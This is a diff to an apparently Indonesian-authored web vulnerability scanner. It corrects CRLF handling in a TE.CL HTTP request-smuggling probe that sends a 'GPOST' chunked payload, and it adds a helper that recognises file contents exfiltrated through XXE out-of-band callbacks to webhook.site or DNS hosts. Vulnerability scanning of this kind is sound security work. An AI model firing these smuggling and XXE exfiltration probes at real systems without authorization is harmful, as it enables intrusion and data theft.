@@ -7360,7 +7360,7 @@ class SatriaBaruScanner:
                     break
                 self.request_count += 1
                 self.stats["requests"] = self.request_count
-                request_line = raw.split(b"\\r\\n", 1)[0].decode("latin-1", "replace")
+                request_line = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                 request_parts = request_line.split()
                 safe_request = " ".join(
                     request_parts[:1] + ([request_parts[1].split("?", 1)[0]] if len(request_parts) > 1 else [])
@@ -7452,6 +7452,7 @@ class SatriaBaruScanner:
         low = second_body.lower()
         parser_error = (
             second["status"] in (400, 405, 501)
+            and second["status"] != b_status
             and bool(re.search(
                 r"unrecognized method|invalid method|method not allowed|gpost|gget|bad request",
                 low,
@@ -7526,7 +7527,7 @@ class SatriaBaruScanner:
         if 92 not in self._confirmed and self._within_budget() and self._smug_te_frontend():
             # TE.CL canonical: front-end decodes the GPOST chunk, while a backend
             # honoring Content-Length consumes only the three-byte chunk-size line.
-            chunked = "5\\r\\nGPOST\\r\\n0\\r\\n\\r\\n"
+            chunked = "5\r\nGPOST\r\n0\r\n\r\n"
             smuggle = self._smug_build(
                 f"POST {base_path} HTTP/1.1",
                 [("Host", cluster_host), ("Content-Length", "3"),
@@ -8361,6 +8362,34 @@ class SatriaBaruScanner:
             joined = " ".join(str(item) for item in (values or []))
             return bool(tag and tag.lower() in joined.lower())
 
+        def _oob_exfil_data(result, tag: str) -> list[str]:
+            """Bedakan callback fetch DTD dari nilai file yang benar-benar terkirim."""
+            if not result:
+                return []
+            interactions = getattr(result, "interactions", []) or []
+            found: list[str] = []
+            if getattr(self.oob, "kind", "") == "webhook_site":
+                token_path = f"/{getattr(self.oob, 'webhook_token', None) or oob_token}/{tag}/"
+                for item in interactions:
+                    value = str(item or "")
+                    if token_path not in value:
+                        continue
+                    rest = value.split(token_path, 1)[1]
+                    data = re.split(r"[/?#&\s]+", rest, maxsplit=1)[0].strip(".")
+                    if data and data.lower() != tag.lower():
+                        found.append(data)
+            else:
+                pattern = re.compile(
+                    r"([A-Za-z0-9._%+-]{1,80})\."
+                    + re.escape(oob_token) + r"\."
+                    + re.escape(tag) + r"\."
+                    + re.escape(oob_domain),
+                    re.I,
+                )
+                for item in interactions:
+                    found.extend(m.group(1) for m in pattern.finditer(str(item or "")))
+            return list(dict.fromkeys(x for x in found if x and x.lower() != tag.lower()))
+
         def _expand_dtd_url(template: str, tag: str) -> str:
             callback = _oob_uri(tag)
             return (
@@ -8519,7 +8548,7 @@ class SatriaBaruScanner:
                         sent_to.append(url)
                 if sent_to:
                     got = self._poll_oob()
-                    got_values = getattr(got, "values", []) if got else []
+                    got_values = _oob_exfil_data(got, tag)
                     if got_values:
                         mark(
                             79, sent_to[0], "xml", "body",
